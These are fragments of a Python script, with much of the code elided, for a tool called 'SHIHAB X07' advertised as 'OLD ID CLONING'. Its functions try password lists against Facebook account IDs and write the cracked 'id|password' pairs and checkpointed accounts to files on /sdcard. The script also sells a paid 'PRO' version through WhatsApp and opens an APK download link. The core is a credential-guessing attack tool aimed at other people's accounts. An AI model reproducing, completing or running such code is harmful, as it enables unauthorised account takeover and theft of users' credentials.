...
try:
        ...
        os.system('python SHIHAB X07.py')
except:pass
...
----------------------------------------------
 Owner     : SHIHAB X07
 Type type : OLD ID CLONING 
 Status    :  FREE
 Version   :  0.1
----------------------------------------------
 SHIHAB X07 PRO VERSION  0.
 Victory is Only From Allah ðŸ¤ž
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if PRO in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/SHIHAB X07_VPN1.0.apk/file');menu()
                        elif PRO in ['8','08']:
                                os.system('');menu()
                        elif PRO in ['0','00']:
                                exit(' Thanks for Use SHIHAB X07 Pro TOOL ðŸ¥° ')
                        else:
                        ...
                        linex()
                        tks = ("Hi SHIHAB X07 Sir, I Need To Buy Your Paid SHIHAB X07 PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SHIHAB X07.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SHIHAB X07-PRO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in PRO:
                                ...
                                print('\r\r\033[1;32m [SHIHAB X07-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SHIHAB X07-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in PRO:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SHIHAB X07-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHIHAB X07-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [SHIHAB X07-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHIHAB X07-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SHIHAB X07-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [SHIHAB X07-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/SHIHAB X07-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [SHIHAB X07-OK] '+uid+' | '+pas+'\033[1;97m')
